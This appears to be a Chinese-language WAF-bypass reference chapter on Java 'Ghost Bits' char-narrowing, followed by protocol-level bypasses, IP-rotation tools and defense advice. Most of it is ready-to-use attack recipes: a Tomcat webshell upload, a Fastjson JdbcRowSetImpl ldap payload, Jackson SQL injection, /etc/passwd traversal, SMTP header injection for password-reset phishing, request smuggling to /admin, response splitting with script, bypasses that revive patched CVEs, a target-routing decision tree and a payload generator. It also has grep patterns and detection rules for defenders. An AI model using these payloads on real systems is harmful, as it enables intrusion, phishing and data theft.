Java 的 `char` 是 **16 位**无符号整数（UTF-16 代码单元），而 HTTP/1.1、SMTP、Redis RESP、文件路径等传输层全部是 **8 位**字节流。正确的桥接方式是显式字符集编码：

```java
// 正确：显式 UTF-8，多字节字符变成多字节序列
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

大量遗留代码、框架内部实现与"快速路径"优化跳过这一步，静默窄化：

```java
// 危险：高 8 位被静默丢弃
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // OutputStream.write(int) 只保留低 8 位
dos.writeBytes(str);         // DataOutputStream 逐字符 cast 写低字节
int v = ch & 0xFF;           // 显式低字节掩码
```

丢失的高 8 位即 **Ghost Bits**——把一个多字节 Unicode 字符在协议层变成攻击者挑选的单个 ASCII 字节：

```plaintext
视图 A（字符串层：WAF / 业务校验 / 日志）
  看到：陪 阮 严 灵 瘍 瘊 ...   "无害 Unicode 乱码，放行"
                  |
                  v       调用栈中某处的静默窄化
视图 B（字节层：协议 / 文件系统 / 解析器 / 类加载器）
  看到：j  .  %  u  \r \n ...  "执行危险语义"
```

数学公式：要让视图 B 看到字节 `T`，任选 `k ∈ 0x01..0xFF`：

```plaintext
c = chr((k << 8) | T)
```

每个危险字节有 **255 个候选 Unicode 字符**——足够躲过任何基于签名的黑名单。与 # 0x06 的 Unicode 兼容归一化（NFKC 等）方向相反：那里是"兼容字符折叠成 ASCII"的正规映射，这里是"任意字符的低 8 位等于目标字节"的算术构造，WAF 无法通过标准归一化预判。

## 7.2 三大根因家族

| 家族 | 根因 | 典型代码 / 行为 | 典型受害者 |
|------|------|-----------------|-----------|
| A — 真实高位截断 | 窄化是无条件且字面的 | `(byte) ch`、`ch & 0xFF`、`OutputStream.write(int)`、`DataOutputStream.writeBytes` | Tomcat `filename*`、BCEL ClassLoader、Lettuce、Angus Mail、HttpClient |
| B — 位运算折叠 | "快速" hex/base64 解码器用位技巧替代严格范围校验，非法字符折叠成合法值 | Jetty `TypeUtil.fromHexDigit` | Openfire、GeoServer、通用 URL 解码 |
| C — Unicode 宽松归一化 | 解码器接受本不该参与协议解析的 Unicode 字符 | `Character.digit(c, 16)`、Jackson `sHexValues[ch & 0xff]`、全角数字 | Fastjson、Jackson、JDK URLDecoder |

Family B 实例——Jetty `TypeUtil.fromHexDigit`（简化）：

```java
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // 保留低 5 位
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // 预期 0..15，但无范围校验
}
```

以 `>`（0x3E）为例：`0x3E & 0x1F = 30`，`(0x3E >> 6) * 25 = 0`，`30 + 0 - 16 = 14 = 0xE`。因此 **`%2>` 被静默解析为 `%2E`（`.`）**。同样的代数使 `%2^`、`%2~` 等价于其他 hex 数字（可见字符中明显的折叠特征：`9=`、`@9`、`` `a ``、`:b`、`;c`、`<d`、`=e`、`>f`、`?g`）。

## 7.3 危险字节 → Ghost 字符映射表

| 目标字节 | Hex | 用途 | Ghost 字符 | 码点 |
|----------|-----|------|------------|------|
| `\t` | 0x09 | 头部续行、解析器混淆 | `ĉ` | U+0109 |
| `\n` | 0x0A | CRLF 注入、日志注入 | `瘊` | U+760A |
| `\r` | 0x0D | CRLF 注入、请求走私 | `瘍` | U+760D |
| ` ` | 0x20 | 头部断开、命令分隔 | `Ġ` | U+0120 |
| `"` | 0x22 | JSON / quoted-printable 断串 | `Ģ` | U+0122 |
| `%` | 0x25 | URL 编码前缀、二次解码 | `严` | U+4E25 |
| `&` | 0x26 | 参数分隔符 | `Ȧ` | U+0226 |
| `'` | 0x27 | SQL 断串 | `ȧ` | U+0227 |
| `.` | 0x2E | 路径穿越、扩展名 | `阮` | U+962E |
| `/` | 0x2F | 路径分隔符 | `丯` | U+4E2F |
| `0`-`3` | 0x30-33 | hex 数字构造 | `丰` `失` `甲` `耳` | U+4E30 等 |
| `;` | 0x3B | 命令分隔、头部续行 | `Ȼ` | U+023B |
| `<` / `>` | 0x3C/3E | XSS / XML 标签 | `ȼ` / `Ⱦ` | U+023C/3E |
| `=` | 0x3D | 参数 / 头值赋值 | `Ƚ` | U+023D |
| `@` | 0x40 | Fastjson `@type`、邮件地址 | `ŀ` | U+0140 |
| `a` `c` `l` `s` | — | 关键字 `class` | `ᙡ` `㹣` `౬` `⑳` | U+1661/3E63/0C6C/2473 |
| `e` | 0x65 | hex 数字 | `来` | U+6765 |
| `j` | 0x6A | 扩展名 `.jsp` | `陪` | U+966A |
| `n` `t` `u` | — | 关键字 `Runtime`、`\u` 转义引入符 | `陮` `Ŵ` `灵` | U+966E/0174/7075 |

选型指引：避开代理项范围 `0xD800..0xDFFF`（高字节 0xD8..0xDF，非合法标量值会被 JVM 字符串解码器替换，破坏绕过）；Latin Extended-A 变体 UTF-8 展开小（2 字节），适合紧凑的 HTTP 头上下文；CJK 变体（3 字节）偏向让 WAF 的"这只是一段文本"分类器放行；跨请求轮换 `k` 防止自适应学习固定映射。

## 7.4 分组件利用配方

### 7.4.1 Tomcat `RFC2231Utility` — 文件上传 Webshell（Family A）

任何接受 multipart 上传且 Tomcat 解析 `Content-Disposition: ... filename*=UTF-8''...` 的端点。Tomcat 的 RFC2231 解码器把每个非百分号字符直接 cast 为 byte，丢弃高 8 位：

```http
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| 阶段 | 看到的文件名 |
|------|-------------|
| WAF / 扩展名过滤 | `1.陪sp`（非 `.jsp`，放行） |
| Tomcat RFC2231 解码器 | `陪` → 低字节 0x6A → `j` |
| 文件系统 | `1.jsp` |

`filename*` 还支持 URL 编码（`1.%6asp`），其解码算法为 `ch & 0x7f`——**双重 Ghost Bits**（如 `1.%鸶繡sp`）。同理，在开启 `allowCasualMultipartParsing` 时可用于隐藏参数名（不能隐藏值），是 CVE-2022-22965 的经典利用路径。更多文件上传混淆手法见 [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md)。

### 7.4.2 Apache Commons BCEL — ClassLoader RCE（Family A）

任何以 `$$BCEL$$...` 解析类名、或经 `JavaReader` → `ByteArrayOutputStream` 循环解码 BCEL 的 sink：

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // 只保留低 8 位
}
```

把恶意 BCEL 字节码的每个字节包进一个低 8 位相等的 Unicode 字符：解码出的字节流是合法 BCEL class，WAF 看到的是一长串无 `$$BCEL$$` 关键字、无 class 签名的 CJK 文本。防守方若要在 WAF 检测 BCEL，必须先复刻 `bos.write(ch)` 语义再做模式匹配。BCEL / 反序列化链的通用背景见 [Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md)。

### 7.4.3 Jackson `charToHex` — SQLi 走私（Family C）

任何 Jackson 解析的 JSON 字段值后续被嵌入 SQL 或其他解析器时，Jackson 对 `\uXXXX` 数字的解析：

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // 先掩码，后查表
}
```

任何低 8 位落在已填充索引上的非 ASCII 字符都返回该 hex 数字。走私数字 `1`（UNION 列数探测）：

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| 视图 | 内容 |
|------|------|
| WAF | `\u丰丰耳失 union select ...`（无前导数字） |
| Jackson | `1 union select 1,2,3-- ` → `1 union select…` |

> **限制**：`ch` 来自 `_inputBuffer`——本地测试走 `ReaderBasedJsonParser`（`char[]` 缓冲，可利用）；**Spring Boot 默认使用 `UTF8StreamJsonParser`（`byte[]` 缓冲），不可利用**。需确认目标实际解析路径。

### 7.4.4 Fastjson `\u` / `\x` 转义绕过（Family B + C）

两个独立面：

(a) `\x` 转义——Fastjson 计算 `digits[x1] * 16 + digits[x2]`，`digits` 表只在 `0-9A-Fa-f` 处填充，**未填充索引静默返回 0**（`\x4_` → `4*16+0 = 0x40 = '@'`）：

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

(b) `\u` 转义——`Character.digit(c, 16)` 接受 ASCII 之外的 Unicode 数字类别（泰文 `๐-๙` U+0E50、旁遮普文 `੦-੯` U+0A66、全角 `０-９` U+FF10）：

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| 视图 | 字段名 |
|------|--------|
| WAF | `\x4_type` / `\u４_type`（无 `@type` 字面量） |
| Fastjson | `@type` → JdbcRowSetImpl autotype gadget 触发 |

> 实测提示：此类 payload 建议经 Yakit 发送，Burp Suite 的编码处理可能破坏绕过效果。

### 7.4.5 Spring / Jetty / Undertow / Vert.x — URL 解码（Family A + B）

两个可组合的招式：

Trick 1 — Family A 字符替换（路径或查询参数）：

```plaintext
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd（字节层）
```

Trick 2 — Family B `%2>` 折叠（当链路中存在 Jetty `TypeUtil.fromHexDigit`）：

```plaintext
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp（解码后）
```

**Spring CVE-2025-41242 全链**（任意文件读取，`StringUtils.uriDecode` 修复于 PR #34673，vulhub 靶场见参考资料）：`StringUtils.uriDecode` 逐段解码路径并 `baos.write(ch)` 收窄，但 **`changed` 必须为 true 才会输出解码结果**——因此单独 `/阮严灵丰丰甲来/` 不触发 Ghost Bits，payload 中至少需要一个真实 `%XX`（如结尾的 `%64`）：

```plaintext
/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
```

| 阶段 | 路径 |
|------|------|
| Spring `isInvalidPath()` | `.%u002e` — 无字面 `..`，放行 |
| `PathResource.resolve()` 的 normalizePath 检测 | 同样不识别 `%u002e` |
| `URIUtil.encodePathSafeEncoding` | 处理 `%u002e` → `%2e`（该处前置 `TypeUtil.isHex` 校验，无法二次变形） |
| 后端文件解析 | `..` → 穿越读取 |

### 7.4.6 Angus Mail / Jakarta Mail — SMTP 注入（Family A）

任何从用户可控字符串构建 SMTP 信封或头部的应用。内部 `ASCIIUtility` 执行 `byte b = (byte) ch;`。用 `瘍瘊` 走私 CRLF：

```plaintext
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| 视图 | 解析结果 |
|------|---------|
| 应用校验 | 单个含怪 CJK 的 `From` 值 |
| SMTP 服务器 | 五条独立头部 + 正文，完全伪造 |

对应 **CVE-2025-7962**（Eclipse Angus Mail / Jakarta Mail SMTP 注入，受影响 ≤ 2.0.3，修复于 2.0.4，报告者正是演讲作者 1ue/blu3r）。真实影响链：Atlassian Jira 类密码重置劫持与 Confluence 域白名单绕过（**CVE-2025-57733**，影响 Jira/Confluence/Bitbucket/Keycloak/TeamCity）——邮件以合法 SPF/DKIM/DMARC 离开企业 SMTP 服务器，但 `To:` 与 `Subject:` 由攻击者选定，高保真钓鱼。CRLF 的通用原理见 [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md)。

### 7.4.7 Apache HttpClient `<= 4.5.9` — 请求走私（Family A）

HTTPCLIENT-1974 / HTTPCLIENT-1978：头值经过 `OutputStreamWriter` 加窄化写路径，`瘍瘊` 被发射为裸 `\r\n`：

```http
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| 跳数 | 所见 |
|------|------|
| 前置代理 / WAF | 一个带超长 `X-Auth-Token` 的请求 |
| 源站 | 两个请求；第二个是 admin POST |

确认 desync 后的 chosen-prefix 攻击见 [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md)。

### 7.4.8 JDK HttpServer — 响应拆分（CVE-2026-21933，Family A）

用户输入反射进响应头时经过 `com.sun.net.httpserver` 的逐字符低字节写入。**CVE-2026-21933**（2026-01 Oracle CPU 披露，受影响 8u471 / 11.0.29 / 17.0.17 / 21.0.9 / 25.0.1，报告者 Zhihui Chen）：

```http
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

服务器发出两个逻辑响应，第二个携带攻击者选定的正文——可升级为存储型 XSS、缓存投毒与 SSO 重定向链。

### 7.4.9 其他组件与负向结论

同一 Family A 原语的不同 sink：**Lettuce**（Redis 客户端，RESP 帧走私 `\r\n` → 任意 `CONFIG SET dir` + `SAVE`，SSRF-to-RCE）、**Jodd `FileNameUtil`**（`阮`/`丯` 路径穿越）、**XMLWriter**（属性/文本节点注入标签名，XXE/XSS 支点）、**ActiveJ HTTP**（与 7.4.7/7.4.8 同形 CRLF）、**Vert.x `MultipartParser`**（Family A）。

负向结论（有校验、不可利用，测试前不必浪费时间）：**Nashorn** 的 `Lexer.convertDigit()` 限制严格；**JSP（Jasper）** 的 `Scanner.getHexadecimalValue()` 有校验。

## 7.5 已修复 CVE 的再激活配方

在对应 CVE 已打补丁、但 WAF 仍前置时使用——把原始 ASCII 攻击平移进字符串规则看不见的形态：

**Openfire CVE-2023-32315（认证绕过，Family B）**——公开绕过是 `/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`（WAF 普遍覆盖）；Ghost Bits `%2>` 折叠变体更难签名：

```http
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

**GeoServer CVE-2024-36401（RCE，Family B）**——公开 WAF 规则通常封堵 `Runtime`，注入一个折叠字符：

```plaintext
Ru%6>time      # %6> -> %6E -> n；表达式求值器看到 Runtime，WAF 从未看到
```

**Spring4Shell CVE-2022-22965（类加载链，Family A）**——必需参数前缀 `class.module.classLoader...`：

```http
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| 字符 | Ghost | 码点 | 低字节 |
|------|-------|------|--------|
| `c` | `㹣` | U+3E63 | 0x63 |
| `l` | `౬` | U+0C6C | 0x6C |
| `a` | `ᙡ` | U+1661 | 0x61 |
| `s` | `⑳` | U+2473 | 0x73 |

Spring 的参数名解析器窄化回 `class`。

**Spring CVE-2025-41242 / JDK CVE-2026-21933 / Angus Mail CVE-2025-7962** — 见 §7.4.5 / §7.4.8 / §7.4.6（后两者本身即 Ghost Bits 类漏洞，报告者即本技术演讲作者）。

## 7.6 探测决策树与字符生成器

```plaintext
后端是 Java？（Server 头、错误页、JSESSIONID、.do/.action、X-Powered-By）
├── 否 → 停止，Ghost Bits 不适用
└── 是 → 存在 WAF / IDS / 输入过滤封堵字面 payload？
    ├── 否 → 直接用字面 payload
    └── 是 → 按 sink 路由：
        multipart 上传 → §7.4.1；JSON 反序列化 → §7.4.3/7.4.4
        ClassLoader/BCEL → §7.4.2；URL 路径/参数 → §7.4.5 + %2> 折叠
        头反射 → §7.4.7/7.4.8；邮件发送 → §7.4.6；Redis/XML → §7.4.9
        ↓
        先做单字符非破坏替换探测（只替换一个被封字符为 Ghost 变体，
        对比状态码 / 长度 / 头回显 / 报错 / 时间）
        ↓
        出现可观测差异 → 全量替换 + 链接对应攻击 playbook
```

```python
def ghost(target_byte: int, k: int = 1) -> str:
    """返回低 8 位等于 target_byte 的 Unicode 字符"""
    if 0xD8 <= k <= 0xDF:            # 代理项范围，另选 k
        raise ValueError("surrogate range")
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

ghost(0x6A, 0x96)   # '陪' —— 255 个候选每字节，跨请求轮换 k
```

## 7.7 防御与检测

**代码层**：禁止手写 `(byte) ch`、`& 0xFF`、`out.write(ch)`、`writeBytes`；协议字段一律 `getBytes(StandardCharsets.UTF_8)` 或严格 ASCII 白名单。

**解码器层**：拒绝非法输入——不得把未知 hex / Unicode 数字 / Base64 字符默认折叠为 0 或低 8 位。

**校验顺序**：先归一化后校验——严格解码 → Unicode NFC/NFKC → 协议归一化（URL `..` 解析、`File.getCanonicalPath`）→ 安全检查 → 执行。

**WAF 多视图归一化**：同时检查原始字符串、`(char) & 0xFF` 视图、URL 解码视图、Unicode-NFKC 视图（含 Jetty lax-hex 语义与 Fastjson `\x` 默认 0 语义的复刻）；任一非原始视图出现危险语义即告警：

```python
ALERT IF:
    DANGEROUS_TOKEN 匹配于  { low_byte 视图 ∪ url_lax_hex 视图 ∪ \u 转义视图 }
    AND DANGEROUS_TOKEN 不匹配于 raw 视图
```

**升级矩阵**：Apache Commons BCEL ≥ 6.12.0；Apache HttpClient ≥ 4.5.10 或迁移 5.x；Angus Mail ≥ 2.0.4；Openfire ≥ 4.7.5 / 4.6.8 / 4.8.x；GeoServer ≥ 2.28.3；JDK 升级修复版本（8/11/17/21/25 均有 fix commit）；Fastjson 升级 2.x 最新版；Tomcat/Spring/Jetty/Undertow 按厂商公告升级。

**蓝队迹象**：协议语法位置（文件名、头值、邮件地址）出现 CJK / Latin-Extended 字符；请求 hex dump 在协议定界符旁出现 `0x20..0x7E` 之外的字节；扫描器报"奇怪 200"而监控未告警——Java 栈中 2025-2026 该模式最常见原因即 Ghost Bits。SAST 首轮 grep：`\(byte\)\s*\w+`、`& 0[xX][fF][fF]`、`writeBytes`、`Character\.digit`、`fromHexDigit`、`charToHex`、`uriDecode`。

---

# 0x08 协议层与基础设施绕过

## 8.1 H2C Smuggling

利用 HTTP/1.1 与 HTTP/2 转换层（h2c upgrade）的头部解析差异，将请求走私穿过 WAF/前端代理到达后端。需结合目标前端协议栈特性（如 Nginx + Tomcat 组合）。协议升级层的同类机制与实战细节见 [Upgrade Header Smuggling](../Upgrade%20Header%20Smuggling/README.md)。

## 8.2 IP 轮换

基于 IP 的限速与封禁是 WAF 的常见全局规则，可通过云 API Gateway 动态轮换出口 IP 规避：

- [FireProx](https://github.com/ustayready/fireprox)：通过 AWS API Gateway 创建临时代理 URL，可直接配合 ffuf 使用。
- [CATSpin](https://github.com/rootcathacking/catspin)：与 FireProx 类似的轻量级 API Gateway 代理轮换。
- [IP-Rotate（BApp）](https://github.com/PortSwigger/ip-rotate)：Burp Suite 插件，使用 API Gateway IP 自动轮换。
- [ShadowClone](https://github.com/fyoorer/ShadowClone)：按输入文件大小与分割因子动态激活容器实例，将输入分块并行执行（如 100 个实例处理按 100 行分割的 10,000 行输入），适合大规模目标快速探测。

> **注意**：轮换 IP 用于规避限速/封禁，与请求体大小绕过、静态资源缺口组合可提升扫描隐蔽性；API Gateway 自身也可能受 CloudFront 等前置防护约束。

---

# 0x09 防御与检测

## 9.1 加固建议

1. **Nginx ACL 避免精确匹配**：`location = /path` 存在系统性绕过风险，使用 `location ~* ^/admin { deny all; }` 正则前缀匹配，并确保代理层与后端使用一致的路径规范化逻辑。
2. **升级与补丁**：ModSecurity v3 升级至 ≥ 3.0.12（CVE-2024-1019）；v2 无补丁，避免在规则中单独依赖 `REQUEST_FILENAME`/`REQUEST_BASENAME`/`PATH_INFO`。
3. **请求体检查阈值**：明确 WAF 的请求体检查上限，对超限请求选择"阻断"而非"放行"（Azure 预防模式）；对必须放行业务，在后端框架层补偿检查。
4. **消除解析差异而非逐条修补**：Vercel 最终方案证明，逐项修补 multipart 语法差异无法收敛——在**原始字节流**上做归一化（移除 NUL、双重反转义、模式封堵）才能消除 WAF 与后端的解析差集。
5. **归一化顺序**：Unicode 归一化（NFKC/NFKD）与 URL 解码必须先于安全检测执行；限制解码深度（如仅 1 次），与应用实际行为对齐。
6. **静态资源一致策略**：对 `.js`/`.css` 等静态路径的 GET 请求应用与动态请求一致的头部内容检查，谨慎对待基于静态扩展名的缓存自动透传。
7. **内联检查深度**：事件处理器检查需解析全部语句而非仅首条；将 `;` 后的语句纳入检测。
8. **字符收窄防护**：WAF 对 Java 后端做多视图归一化（原始 / 低 8 位 / NFKC / URL 解码视图并行检查）；协议字段用严格 ASCII 白名单；依赖升级按 # 0x07 §7.7 矩阵执行。

## 9.2 检测方法

- 监控含非常规控制字符（`\x85`、`\xA0`、`\x1F`–`\x0B`、`\x09`、`\x0C`）的请求路径，与 matrix 参数 `;` 出现在路径段开头（如 `;1337/api/...`、`;@evil.com/url`）的请求。
- 告警头部值中的 tab/空格续行（Line Folding）模式。
- 监控超过 WAF 检查阈值且 `Content-Length` 异常的 POST/PUT/PATCH。
- multipart 请求中：重复 `boundary=`、多个 `Content-Type`、部件级非 utf8 charset、结束标记尾空格、`\n` 单独作分隔符——任一出现即标记。
- 对编码深度异常（同一参数被多次 URL 编码、Unicode 兼容字符混入 ASCII 上下文）的输入做回溯审计。
- 协议语法位置（文件名、头值、邮件地址）出现 CJK / Latin-Extended 字符，且请求 hex dump 在协议定界符旁有 `0x20..0x7E` 之外字节——Ghost Bits 典型特征（# 0x07 §7.7）。

---

# 0x0A 工具

| 工具 | 用途 |
|------|------|
| [nowafpls](https://github.com/assetnote/nowafpls) | Burp 插件，向请求注入垃圾数据撑大请求体以越过 WAF 检查阈值 |
| [FireProx](https://github.com/ustayready/fireprox) | AWS API Gateway 临时代理，IP 轮换（ffuf 友好） |
| [IP-Rotate](https://github.com/PortSwigger/ip-rotate) | Burp 官方插件，API Gateway IP 轮换 |
| [ShadowClone](https://github.com/fyoorer/ShadowClone) | 容器实例并行执行，大规模探测 |
| [CATSpin](https://github.com/rootcathacking/catspin) | 轻量 API Gateway 代理轮换 |

---

## 参考资料

- [Exploiting HTTP Parsers Inconsistencies — rafa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)（Nginx ACL 绕过字符矩阵、AWS WAF Line Folding 原始研究；现迁移至 blog.bugport.net）
- [ModSecurity: Path Confusion and really easy bypass on v2 and v3 — SicuraNext](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)（CVE-2024-1019）
- [$170k in Bypasses: The Vercel React2Shell Challenge — Hacktron](https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass)（CVE-2025-55182，multipart 五连绕过）
- [Exploring Javascript events & Bypassing WAFs via character normalization — 0x999](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization)
- [Turning a harmless XSS behind a WAF into a realistic phishing vector — hackcommander](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [WAF Bypassing with Unicode Compatibility — jlajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)
- [How I found a 0-Click Account takeover in a public BBP — hesar101](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [AWS WAF quotas — AWS 官方文档](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)
- [Azure Application Gateway WAF 请求大小限制 — Microsoft Learn](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)
- [Akamai 社区：WAF 请求体检查限制](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)（默认 8 KB，Advanced Metadata 可扩至 128 KB）
- [Cloudflare Ruleset Engine — HTTP request body fields](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)
- [busboy lib/utils.js — charset 映射源码](https://github.com/mscdex/busboy/blob/6b3dcf69d38c1a8d53a0b3e4c88ba296f6c91525/lib/utils.js#L403-L406)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PayloadsAllTheThings — XSS Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)
- [5 Ways I Bypassed Your WAF — allypetitt (Medium)](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)
- [Unicode 兼容字符查询表 — compart.com](https://www.compart.com/en/unicode)
- [WAF 绕过技术全景（视频）](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [Cast Attack: A New Threat Posed by Ghost Bits in Java — Black Hat Asia 2026 幻灯片](https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf)（# 0x07 原始研究；演讲者 Xinyu Bai、Zhihui Chen，贡献者 Zongzheng Zheng）
- [Ghost Bits 详解 — 珂技知识分享（gm7.org 转载）](https://www.gm7.org/archives/111309)（fastjson/jackson/BCEL/tomcat/URLDecoder/jetty/spring/httpClient 逐组件源码级分析，含负向结论）
- [Cast Attack: ghost bits in Java as a new class of parser differential attacks — dbugs](https://dbugs.ptsecurity.com/news/cast-attack-ghost-bits-in-java-as-a-new-class-of-parser-differential-attacks-20260505)
- [vulhub — Spring CVE-2025-41242 复现环境](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2025-41242/README.zh-cn.md)
